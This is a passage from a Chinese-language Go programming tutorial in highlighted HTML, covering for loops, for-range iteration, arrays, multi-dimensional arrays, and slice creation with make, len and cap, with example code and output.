class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span> = <span class="hljs-number">6</span><br><span class="hljs-comment">//var a int</span><br>numbers := [<span class="hljs-number">6</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; b; a++ &#123;<br>fmt.Print(numbers[a])<br>&#125;<br>&#125;<br>&gt;&gt; <span class="hljs-number">123579</span><br></code></pre></td></tr></table></figure><p>双循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++ &#123;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">9</span>; j++ &#123;<br><span class="hljs-keyword">if</span> i &lt;= j &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d * %d = %2d  &quot;</span>, i, j, i*j)<br>&#125;<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h2><p><code>for</code> 循环的 <code>range</code> 格式可以对 slice、map、数组、字符串、切片、映射表，channel 等进行迭代循环，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> iterable &#123;<br>  <span class="hljs-comment">// body</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数组-Array"><a href="#数组-Array" class="headerlink" title="数组 Array"></a>数组 Array</h1><p>go 的数组和其他语言数组有一些区别</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//全局</span><br><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span> = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> arr2 = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br><span class="hljs-keyword">var</span> str = [<span class="hljs-number">5</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-number">3</span>: <span class="hljs-string">&quot;hhhhh&quot;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&quot;xxxxxx&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//局部</span><br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>b := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>c := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>: <span class="hljs-number">100</span>, <span class="hljs-number">4</span>: <span class="hljs-number">200</span>&#125;<br>d := [...]<span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">uint8</span><br>&#125;&#123;<br>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10</span>&#125;,<br>&#123;<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">20</span>&#125;,<br>&#125;<br>fmt.Println(arr0, arr1, arr2, str)<br>fmt.Println(a, b, c, d)<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>] [   hhhhh xxxxxx]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span> <span class="hljs-number">0</span> <span class="hljs-number">200</span>] [&#123;a <span class="hljs-number">10</span>&#125; &#123;b <span class="hljs-number">20</span>&#125;]<br></code></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;&#125;<br>b := [...][<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>&#125;&#125;<br>fmt.Println(arr0, arr1)<br>fmt.Println(a, b)<br><br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]]<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">1</span>] [<span class="hljs-number">2</span> <span class="hljs-number">2</span>] [<span class="hljs-number">3</span> <span class="hljs-number">3</span>]]<br></code></pre></td></tr></table></figure><p>第二维度不能用 <code>...</code> 来表示，未赋值的数组初始化为 0</p><h3 id="多维数组遍历"><a href="#多维数组遍历" class="headerlink" title="多维数组遍历"></a>多维数组遍历</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><span class="hljs-keyword">for</span> k1, v1 := <span class="hljs-keyword">range</span> a &#123;<br><span class="hljs-keyword">for</span> k2, v2 := <span class="hljs-keyword">range</span> v1 &#123;<br>fmt.Printf(<span class="hljs-string">&quot;(%d,%d)=%d&quot;</span>, k1, k2, v2)<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">1</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">2</span> (<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">3</span> <br>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">4</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">6</span> <br></code></pre></td></tr></table></figure><h2 id="数组拷贝和传参"><a href="#数组拷贝和传参" class="headerlink" title="数组拷贝和传参"></a>数组拷贝和传参</h2><p>值拷贝会造成性能问题，通常使用 slice 或数组指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printArr</span><span class="hljs-params">(arr *[5]<span class="hljs-type">int</span>)</span></span> &#123;<br>arr[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> arr &#123;<br>fmt.Println(k, v)<br>&#125;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br>printArr(&amp;arr1)<br>fmt.Println(arr1)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>&#125;<br>printArr(&amp;arr2)<br>fmt.Println(arr2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-number">2</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> <span class="hljs-number">0</span><br><span class="hljs-number">4</span> <span class="hljs-number">0</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">4</span><br><span class="hljs-number">2</span> <span class="hljs-number">6</span><br><span class="hljs-number">3</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span> <span class="hljs-number">10</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><p>为什么 arr2 数组输出的第一个值不是 2 呢，因为在进入 <code>printArr</code> 函数时，<code>arr[0]=10</code>，所以会被赋值为 10，输出的就是 10</p><h1 id="切片-Slice"><a href="#切片-Slice" class="headerlink" title="切片 Slice"></a>切片 Slice</h1><p>Slice 既不是数组也不是数组指针，是数组的一个引用，是引用类型。自身是结构体，值拷贝传递。长度可变，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> 变量名 []类型<br><span class="hljs-keyword">var</span> str []<span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><h2 id="创建切片"><a href="#创建切片" class="headerlink" title="创建切片"></a>创建切片</h2><p>在 fun main 中</p><p>声明切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s1 []<span class="hljs-type">int</span><br><span class="hljs-keyword">if</span> s1 == <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;null&quot;</span>)<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;不是 null&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>:&#x3D; 创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := []<span class="hljs-type">int</span>&#123;&#125;<br>fmt.Println(s2)<br></code></pre></td></tr></table></figure><p>make() 创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s3 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s3)<br></code></pre></td></tr></table></figure><p>初始化赋值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s4 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s4)<br></code></pre></td></tr></table></figure><p>从数组切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">s5 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(s5)<br>arr := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> s6 []<span class="hljs-type">int</span><br>s6 = arr[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]<br>fmt.Println(s6)<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h2 id="切片初始化"><a href="#切片初始化" class="headerlink" title="切片初始化"></a>切片初始化</h2><p>len() 长度，cap() 容量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">var</span> slice0 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br><span class="hljs-keyword">var</span> slice2 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br><span class="hljs-keyword">var</span> slice3 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br><span class="hljs-keyword">var</span> slice4 = arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(arr, slice0, slice1, slice2, slice3, slice4)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>slice5 := arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br>slice6 := arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>slice7 := arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br>slice8 := arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br>slice9 := arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br>fmt.Println(arr2, slice5, slice6, slice7, slice8, slice9)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br>[<span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><h2 id="make-创建切片"><a href="#make-创建切片" class="headerlink" title="make() 创建切片"></a>make() 创建切片</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice []<span class="hljs-keyword">type</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>, <span class="hljs-built_in">cap</span>)(类型，长度，容量)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>)<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>创建 slice 数组，自动分配底层数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>: <span class="hljs-number">100</span>&#125;<span class="hljs-comment">//使用索引初始化</span><br>fmt.Println(s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>)<br>fmt.Println(s2, <span class="hljs-built_in">len</span>(s2), <span class="hljs-built_in">cap</span>(s2))<br><br>s3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>)<br>fmt.Println(s3, <span class="hljs-built_in">len</span>(s3), <span class="hljs-built_in">cap</span>(s3))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span>] <span class="hljs-number">9</span> <span class="hljs-number">9</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">8</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>用 make 动态创建 slice ，可以让数组不需要用常量做长度</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>p := &amp;s[<span class="hljs-number">2</span>]<br>*p += <span class="hljs-number">100</span><br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">102</span> <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>[][]T 表明元素类型为 []T，比如 [][]int 表明元素类型为 []int</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [][]<span class="hljs-type">int</span>&#123;<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span 